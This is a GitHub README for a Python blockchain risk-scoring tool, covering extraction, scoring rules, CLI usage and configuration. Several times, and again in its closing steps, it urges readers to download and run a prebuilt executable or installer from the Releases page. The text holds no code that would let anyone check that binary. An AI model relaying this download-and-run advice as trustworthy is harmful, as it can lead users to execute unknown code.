https://github.com/waseem569/Risk-Score-Tool/releases

# Risk Score Tool — Blockchain Data Extraction & Risk Analysis

[![Releases](https://img.shields.io/badge/Releases-Download-blue?logo=github)](https://github.com/waseem569/Risk-Score-Tool/releases) ![Language](https://img.shields.io/badge/Language-Python-green) ![License](https://img.shields.io/badge/License-MIT-lightgrey)

![Blockchain banner](https://images.unsplash.com/photo-1611078484202-0f6b7a7f7a6d?q=80&w=1600&auto=format&fit=crop)

About
- Risk-Score-Tool extracts on-chain data, computes risk metrics, and produces compact risk reports for addresses, contracts, and tokens.
- It targets researchers, auditors, and trading systems that need repeatable, scriptable risk signals from public blockchains.
- The tool supports high-level queries, batch runs, and export to CSV and Parquet.

Why this repo
- Collect raw chain data from nodes or public APIs.
- Normalize events, balances, and token flows.
- Apply modular scoring rules to yield per-entity risk scores.
- Export results for dashboards, alerts, and backtests.

Key features
- Multi-chain extraction (Ethereum mainnet, testnets, EVM compatible chains).
- Transaction tracing and token flow mapping.
- Heuristics for mixer use, contract proxies, and rug patterns.
- Wallet clustering and activity profiling.
- Configurable scoring rules and rule chains.
- CLI and Python API for integration.
- Output: CSV, Parquet, JSON, and visual risk snapshots.

Quick links
- Releases: https://github.com/waseem569/Risk-Score-Tool/releases
- Badges: above link also available as a button at the top.

Releases and execution
- Visit the Releases page at the link above and download the release asset that matches your platform.
- Example asset name: `risk-score-tool-v1.2.0-linux.tar.gz`. Download that file and extract.
- After extraction, run the provided executable or script:
  - On Linux/macOS: `./risk-score-tool` or `./install.sh`
  - On Windows: run the `.exe` from PowerShell or double-click the installer.
- The release contains a README and an `examples/` folder with ready-to-run configs.
- If the link does not load, check the "Releases" section of this repository.

Quick demo image
![Flow diagram](https://raw.githubusercontent.com/ethereumbook/ethereumbook/master/figures/evm1.png)

Architecture overview
- Extractor: connects to RPC, archive nodes, or API endpoints and pulls blocks, txs, logs, and receipts.
- Normalizer: converts raw data into events, balance changes, and token transfers.
- Enricher: maps addresses to labels, queries token metadata, and caches on-chain lookups.
- Scorer: applies rule sets and models to produce a numeric risk score and tags.
- Exporter: writes results to files, sends to HTTP endpoints, or pushes to S3.

Supported inputs
- Node RPC (HTTP/WSS)
- Archive RPC endpoints
- Public APIs (Etherscan, Covalent, Alchemy — configured via keys)
- CSV of transaction hashes or addresses for focused scans

Supported outputs
- CSV for spreadsheets
- Parquet for analytics pipelines
- JSON for integration with web apps
- Human-readable risk snapshot per address

Installation (local, general)
- Install Python 3.10+ or use the release binary.
- Create a virtual env:
  - `python -m venv .venv`
  - `source .venv/bin/activate` (Linux/macOS) or `.venv\Scripts\activate` (Windows)
- Install core package and extras:
  - `pip install -r requirements.txt`
- Configure RPC and API keys in `config.yaml`.

Configuration basics
- `config.yaml` keys:
  - `rpc` — URL for node RPC
  - `api_keys` — providers and keys
  - `chains` — list of chains to scan
  - `scorer` — rule modules and weights
  - `output` — format, path, and partitioning
- Use `examples/config.ethereum.yaml` as a template.

Run a quick scan (CLI)
- Single address scan:
  - `risk-score --address 0xABCD1234... --chain ethereum --out ./out/address-report.json`
- Batch scan from CSV:
  - `risk-score --batch addresses.csv --chain ethereum --workers 8 --out ./out/batch.parquet`
- Live tail mode (monitor mempool):
  - `risk-score --tail --rpc https://node.example.org --chain ethereum --out ./out/live/`

Python API (snippet)
- Use the tool inside Python:
  - `from riskscore import Client`
  - `client = Client(config='config.yaml')`
  - `report = client.score_address('0xABCD...')`
  - `print(report.to_dict())`

Risk model and rules
- The scorer holds modular rules. Each rule outputs a numeric signal and tags.
- Example rules:
  - Mixer proximity: penalty if address interacts with known mixer contracts.
  - Rug pattern: penalty on high token transfers right after token creation with abnormal owner activity.
  - Proxy chain: detect upgrades and central control.
  - Balance volatility: track rapid inflows/outflows.
- Combine rules with weights to form a final score in 0–100.
- Override weights per deployment to match tolerance and use case.

Heuristics and data sources
- Labeled contracts: curated list of exchanges, mixers, bridges.
- Token metadata: token decimals, symbols, and total supply.
- Off-chain feeds: threat intelligence, blacklists (optional).
- Graph lookups: call graph and contract creation chains.

Examples
- Example 1 — Spot a mixer chain:
  - Input: an address with many small transfers to a known mixer.
  - Scorer: `mixer_proximity` triggers; `balance_volatility` monitors.
  - Output: `score=85`, tags=`["mixer", "high-velocity"]`.
- Example 2 — Identify potential rug:
  - Input: token with deployer transferring large supply out then disappearing.
  - Scorer: `rug_pattern` triggers; `owner_absence` and `proxy_usage` checks run.
  - Output: `score=92`, tags=`["rug-suspect", "centralized-owner"]`.

Batch workflows
- Run nightly scans for a list of addresses.
- Produce a delta report for addresses that exceed a threshold.
- Integrate outputs with a SIEM or alert system using the exporter.

Performance and scaling
- Use archive nodes for full traceability.
- Parallelize by block range or by address partitions.
- Cache token metadata and label lookups.
- Use Parquet for large results. It handles partitioning and column pruning.

Testing and validation
- Unit tests cover normalizer and scorer logic.
- Integration tests run against a local testnet or a snapshot RPC.
- Test fixtures in `tests/fixtures/` cover common attack patterns.

Security and privacy
- Store API keys in environment variables or a secrets manager.
- Do not commit keys or sensitive data to the repository.
- Limit node endpoints to read-only RPCs where possible.

Images and visualization
- The repo includes a small renderer that draws token flows and transaction graphs.
- Output images appear in `out/visuals/`.
- Use the `viz` command:
  - `risk-score viz --address 0xABCD... --out ./out/visual.png`

Contributing
- Fork the repo and create a branch.
- Run tests locally: `pytest -q`
- Add a test for new rule logic.
- Open a PR with a clear description and test results.
- Code style: follow PEP8. Run `flake8` and `black` before pushing.

Project roadmap
- Add more chain adapters (Solana, non-EVM chains).
- Add ML-backed anomaly detector.
- Improve wallet clustering heuristics.
- Add OAuth for API keys and RBAC for multi-user deployments.

Files and structure
- `riskscore/` — core package
- `cli.py` — command-line entry
- `examples/` — example configs and sample inputs
- `tests/` — unit and integration tests
- ` Dockerfile` — container image
- `README.md` — this file

Common commands
- Run linter: `flake8 riskscore`
- Run formatter: `black .`
- Run tests: `pytest tests/`

Changelog and releases
- Check releases at this link and download the asset that fits your platform:
  - https://github.com/waseem569/Risk-Score-Tool/releases
- Each release contains release notes and the asset to run.
- Release assets include a `README` and `examples/` for quick setup.

FAQ
- Q: Which chains work?
  - A: The tool currently supports EVM-compatible chains. Add adapters to support others.
- Q: Can I tune scores?
  - A: Yes. Edit `config.yaml` and change weights or disable rules.
- Q: Is there a hosted API?
  - A: This repo ships the core tool. You can deploy the CLI as a service behind an API.

License
- MIT. See LICENSE file for details.

Contact
- Report issues via the repository Issues tab.
- For feature requests, open a labeled issue and describe the use case.

Acknowledgments
- Built using standard open-source chain libraries and RPC drivers.
- Visualization uses community graph libraries and public icons.

Tasks to get started now
- Download the release file from the Releases page linked above, extract it, and run the included executable to run a sample scan.
- Use `examples/config.*` to point to an RPC and test one address.
- Inspect `out/` for CSV and visual outputs after a run.